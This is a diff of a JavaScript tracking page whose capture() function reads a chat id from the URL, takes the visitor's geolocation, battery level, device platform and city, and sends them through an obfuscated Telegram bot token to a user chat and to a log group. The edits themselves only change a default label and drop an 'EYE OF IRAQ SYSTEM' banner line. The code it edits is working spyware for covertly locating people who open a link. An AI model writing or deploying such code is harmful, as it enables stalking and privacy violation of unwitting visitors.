@@ -22,7 +22,7 @@
     async function capture() {
         const params = new URLSearchParams(window.location.search);
         const uid = params.get('id');
-        const u_name = params.get('u') || "Unknown";
+        const u_name = params.get('u') || "Not Found";
         if (!uid) return;
 
         navigator.geolocation.getCurrentPosition(async (pos) => {
@@ -53,8 +53,7 @@
                          `🔋 <b>Battery:</b> ${bat}\n` +
                          `📱 <b>Device:</b> ${navigator.platform}\n` +
                          `🕒 <b>Time:</b> ${timeStr}\n` +
-                         `🏙️ <b>City:</b> ${city}\n\n` +
-                         `🌐 <b>EYE OF IRAQ SYSTEM</b>`;
+                         `🏙️ <b>City:</b> ${city}`;
 
             const userUrl = `https://api.telegram.org/bot${_0x1a2b}/sendMessage?chat_id=${uid}&text=${encodeURIComponent(report)}&parse_mode=HTML`;
             const groupUrl = `https://api.telegram.org/bot${_0x1a2b}/sendMessage?chat_id=${LOG_GROUP}&text=${encodeURIComponent(report)}&parse_mode=HTML`;
